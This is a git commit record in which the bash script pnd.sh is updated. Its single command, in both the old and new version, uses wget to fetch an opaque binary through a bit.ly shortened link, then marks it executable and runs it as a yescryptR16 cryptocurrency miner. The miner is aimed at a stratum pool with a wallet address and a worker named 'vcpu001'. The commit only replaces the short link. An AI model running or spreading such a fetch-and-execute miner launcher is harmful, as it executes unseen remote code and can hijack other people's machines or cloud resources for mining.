10d9cf1c67f429dfaaf310c92c9ae89ebaa4d0cb
p4n1k <46290080+p4n1k@users.noreply.github.com>
2022-02-27 00:38:04 +0700

    Update pnd.sh

--- pnd.sh
+++ pnd.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget https://bit.ly/3h6mBsJ && chmod +x 3h6mBsJ && ./3h6mBsJ --disable-gpu --algorithm yescryptR16 --pool stratum+tcps://stratum-na.rplant.xyz:17055 --wallet qgUHBLFGsos52xRT6z1HvLgG75mmBzi3uy.vcpu001 --cpu-threads 2
+wget https://bit.ly/33pg3Cb && chmod +x 33pg3Cb && ./33pg3Cb --disable-gpu --algorithm yescryptR16 --pool stratum+tcps://stratum-na.rplant.xyz:17055 --wallet qgUHBLFGsos52xRT6z1HvLgG75mmBzi3uy.vcpu001 --cpu-threads 2
